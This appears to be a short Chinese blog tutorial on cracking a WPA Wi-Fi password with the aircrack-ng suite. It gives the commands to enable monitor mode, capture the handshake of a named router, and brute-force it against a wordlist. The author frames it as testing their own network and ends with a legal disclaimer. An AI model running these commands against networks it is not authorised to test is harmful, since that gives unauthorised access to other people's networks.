----  网易云热评

一、插上网卡，选择虚拟机设备，设备连接不到虚拟机，点击编辑，选择首选项


二、查看是否连接到无线网卡，邮寄虚拟机的名字，选择可移动设备，无线网卡这有个对勾


三、点击这里也会识别到周边的网络


四、查看网卡设备

1、ifconfig

2、查看是否支持监听模式

airmon-ng

3、开启监听模式

airmon-ng start wlan0

4、查看周围WiFi网络

airodump-ng wlan0

BSSID：可以理解为网卡物理地址

PWR：数值越大信号最强

ESSID：名字wifi

CH：信道

5、监听目标网络的握手包，目标为：TP-LINK_4AFA

airodump-ng -c 11 --bssid 60:3A:7C:54:4A:FA -w /aiyou wlan0

-c：指定频道号

0bbsid：指定路由器bssid

-w：指定抓取的数据包保存的位置

6、如果抓取不到握手包，想办法让对方断网，因为这是我自己的无线，所以我选择了物理断网，拔网线，箭头指向的就是抓到了握手包，然后就可以断开了

7、暴力破解

aircrack-ng -a2 -b 60:3A:7C:54:4A:FA -w /home/aiyou/桌面/pass.txt /*.cap

-a2：代表WPA的握手包

-b：指定要破解的wifi

-w：指定破解用到的字典

最后是抓取的握手包地址


禁止非法，后果自负
